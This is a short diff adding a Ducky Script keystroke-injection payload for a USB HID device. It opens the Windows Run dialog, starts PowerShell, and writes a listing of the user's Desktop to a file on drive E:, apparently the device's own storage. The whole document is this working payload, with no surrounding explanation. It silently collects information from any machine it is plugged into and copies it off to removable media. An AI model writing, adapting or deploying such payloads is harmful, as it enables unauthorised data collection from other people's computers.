@@ -1,0 +1,7 @@
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+STRING dir $env:USERPROFILE\Desktop > E:\desktop_items.txt
+ENTER
